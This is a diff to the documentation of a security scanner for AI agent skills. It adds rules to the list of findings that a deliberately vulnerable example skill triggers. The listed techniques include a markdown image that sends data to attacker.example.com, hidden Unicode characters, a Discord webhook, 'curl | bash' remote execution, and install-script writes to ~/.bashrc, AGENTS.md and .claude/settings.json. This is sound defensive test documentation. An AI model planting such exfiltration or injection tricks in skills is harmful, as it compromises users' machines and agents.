@@ -10,8 +10,12 @@ When `pruner scan examples/vulnerable-skill --without-cisco` runs, the Coroboros
 | FC005 | `SKILL.md` | `license: "Apache 2"` is not a valid SPDX identifier (correct: `Apache-2.0`). |
 | PI-UNI-001 | `SKILL.md` | Hidden Unicode Tag block following `Hello`. |
 | PI-UNI-003 | `SKILL.md` | Bidi override (U+202E) inside the bidi-override section. |
+| PI-UNI-005 | `SKILL.md` | Clustered zero-width characters inside the zero-width-cluster section. |
 | PI-MDIMG-001 | `SKILL.md` | `![pixel](https://attacker.example.com/?data=X)` — markdown image with query string. |
 | PI-IDFILE-001 | `scripts/install.sh` | `>> ~/.bashrc`, `>> AGENTS.md`, `cp ... .claude/settings.json`. |
+| PI-EXFIL-001 | `scripts/install.sh` | Discord webhook URL. |
+| PI-EXFIL-002 | `scripts/install.sh` | `curl ... | bash` remote-fetch-and-execute. |
+| PI-PERM-001 | `SKILL.md` | `allowed-tools: Read,Edit` declared yet `scripts/install.sh` invokes shell. |
 | PI-PEP723-001 | `scripts/setup.py` | PEP-723 block with `dependencies = ["requests", "rich"]` — neither pinned. |
 
 Run:
@@ -21,6 +25,6 @@ pruner scan examples/vulnerable-skill --without-cisco --format json --output /tm
 jq '[.findings[].id] | unique' /tmp/vuln.json
 ```
 
-Expected `id` set covers at least: `FC001`, `FC003`, `FC004`, `FC005`, `PI-UNI-001`, `PI-UNI-003`, `PI-MDIMG-001`, `PI-IDFILE-001`, `PI-PEP723-001`.
+Expected `id` set covers at least: `FC001`, `FC003`, `FC004`, `FC005`, `PI-UNI-001`, `PI-UNI-003`, `PI-UNI-005`, `PI-MDIMG-001`, `PI-IDFILE-001`, `PI-EXFIL-001`, `PI-EXFIL-002`, `PI-PERM-001`, `PI-PEP723-001`.
 
 PI-UNI-002 (variation selectors) and PI-UNI-004 (homoglyphs) are not tripped by this fixture; their positive fixtures live in the per-rule unit tests at `wrapper/tests/rules/`.
